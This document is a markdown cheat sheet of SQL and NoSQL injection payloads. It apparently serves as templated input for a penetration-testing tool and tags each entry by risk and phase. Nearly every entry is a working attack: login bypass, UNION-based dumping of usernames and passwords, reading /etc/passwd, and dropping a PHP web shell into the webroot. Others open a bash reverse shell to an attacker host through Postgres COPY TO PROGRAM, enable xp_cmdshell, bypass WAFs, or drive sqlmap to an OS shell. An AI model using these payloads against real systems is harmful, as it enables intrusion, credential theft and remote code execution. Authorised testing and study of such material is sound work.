# SQLi Payloads

> SQL Injection payloads — auth bypass, UNION, error-based, blind/boolean, time-based, WAF bypass

<!-- tags: sqli, sql, injection, web, payload, exploit -->

---

## bypass sqli auth classic
Bypass login by always-true comment.

```bash
echo "admin' or 1=1-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,authbypass,login -->

---

## bypass sqli auth hash comment
Closes hash style or terminates statement.

```bash
echo "admin' or 1=1#"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,authbypass -->

---

## bypass sqli auth no username
Use null/empty user with always-true clause.

```bash
echo "' or 0=0 #"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,authbypass -->

---

## detect sqli injection point
Single quote test to break syntax.

```bash
echo "{{PARAM:str:id}}=1'"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,detection -->

---

## detect sqli boolean blind
Compare responses for boolean blind detection.

```bash
echo "{{PARAM:str:id}}=1' AND 1=1-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,boolean -->

---

## detect sqli time based blind mysql
Detect via SLEEP delay.

```bash
echo "{{PARAM:str:id}}=1' AND SLEEP(5)-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,mysql -->

---

## detect sqli time based blind postgres
Postgres time delay.

```bash
echo "{{PARAM:str:id}}=1'; SELECT pg_sleep(5)-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,postgres -->

---

## detect sqli time based blind mssql
WAITFOR DELAY for SQL Server.

```bash
echo "{{PARAM:str:id}}=1'; WAITFOR DELAY '0:0:5'-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,mssql -->

---

## detect sqli time based blind oracle
Oracle dbms_pipe time delay.

```bash
echo "{{PARAM:str:id}}=1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)='a"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,oracle -->

---

## enum sqli union columns order by
Increment until error.

```bash
echo "{{PARAM:str:id}}=1' ORDER BY {{N:int:5}}-- -"
```

<!-- meta: risk=safe | phase=enum | tags=sqli,union,columns -->

---

## enum sqli union columns null
Increase NULL count to find column number.

```bash
echo "{{PARAM:str:id}}=1' UNION SELECT NULL,NULL,NULL-- -"
```

<!-- meta: risk=safe | phase=enum | tags=sqli,union,columns -->

---

## dump sqli union version mysql
Get DB version via UNION.

```bash
echo "{{PARAM:str:id}}=1' UNION SELECT 1,version(),3-- -"
```

<!-- meta: risk=safe | phase=enum | tags=sqli,union,banner,mysql -->

---

## enum sqli union databases mysql
Pull all schemas.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(schema_name),5,6,7 FROM information_schema.schemata-- -"
```

<!-- meta: risk=med | phase=enum | tags=sqli,union,enum,mysql -->

---

## enum sqli union tables mysql
List tables for specific DB.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(table_name),5,6,7 FROM information_schema.tables WHERE table_schema='{{DB:str:hotel}}'-- -"
```

<!-- meta: risk=med | phase=enum | tags=sqli,union,enum,mysql -->

---

## enum sqli union columns mysql
List columns of a target table.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(column_name),5,6,7 FROM information_schema.columns WHERE table_name='{{TABLE:str:user}}'-- -"
```

<!-- meta: risk=med | phase=enum | tags=sqli,union,enum,mysql -->

---

## dump sqli union data mysql
Dump rows from chosen table.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(username,0x3a,password),5,6,7 FROM {{TABLE:str:users}}-- -"
```

<!-- meta: risk=high | phase=exploit | tags=sqli,union,dump,mysql -->

---

## dump sqli error based extractvalue mysql
Trigger error to leak data.

```bash
echo "{{PARAM:str:id}}=1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,error,mysql -->

---

## dump sqli error based updatexml mysql
Same idea via UPDATEXML.

```bash
echo "{{PARAM:str:id}}=1' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,error,mysql -->

---

## sqli read file load_file mysql
Read server file via LOAD_FILE — needs FILE priv.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
```

<!-- meta: risk=high | phase=exploit | tags=sqli,fileread,mysql -->

---

## sqli write webshell outfile mysql
Drop PHP shell to webroot.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -"
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,rce,filewrite,mysql -->

---

## sqli rce copy program postgres
Reverse shell via COPY TO PROGRAM.

```bash
echo "COPY (SELECT '') to PROGRAM 'bash -c \"bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}} 0>&1\"'"
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,rce,postgres -->

---

## sqli rce xp_cmdshell mssql
Enable + run OS command via xp_cmdshell.

```bash
echo "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '{{CMD:str:whoami}}'-- -"
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,rce,mssql -->

---

## bypass sqli WAF inline comments
Break keywords with /**/ comments.

```bash
echo "UN/**/ION SE/**/LECT 1,2,3-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,waf,bypass -->

---

## bypass sqli WAF mixed case url encode
Bypass naive filters.

```bash
echo "%55nIoN%20%53eLeCt%201,2,3--%20-"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,waf,encoding -->

---

## bypass sqli WAF char encoding
Use CHAR()/CONCAT to avoid quoted strings.

```bash
echo "UNION SELECT CHAR(97,100,109,105,110)-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,waf,bypass -->

---

## sqli sqlmap burp request
Run sqlmap against saved Burp request.

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --level 5 --risk 3 --dbs
```

<!-- meta: risk=med | phase=exploit | tags=sqli,sqlmap,burp -->

---

## sqli sqlmap read file
Read file via sqlmap.

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --file-read=/etc/passwd
```

<!-- meta: risk=high | phase=exploit | tags=sqli,sqlmap,fileread -->

---

## sqli sqlmap os shell rce
Drop OS shell over the SQLi.

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --os-shell
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,sqlmap,rce -->

---

## sqli sqlmap specific technique
Force only the listed techniques (B/E/U/S/T/Q).

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --technique=UE -D {{DB:str:hotel}} --dump-all --dbms=MySQL
```

<!-- meta: risk=med | phase=exploit | tags=sqli,sqlmap -->

---

## bypass nosqli login mongodb
Use $ne to bypass login JSON.

```bash
echo '{"username":{"$ne":null},"password":{"$ne":null}}'
```

<!-- meta: risk=med | phase=exploit | tags=nosqli,mongodb,authbypass -->

---

## brute nosqli regex mongodb
Iterate regex to extract password char by char.

```bash
echo '{"username":"admin","password":{"$regex":"^{{CHAR:str:a}}"}}'
```

<!-- meta: risk=med | phase=exploit | tags=nosqli,mongodb,blind -->
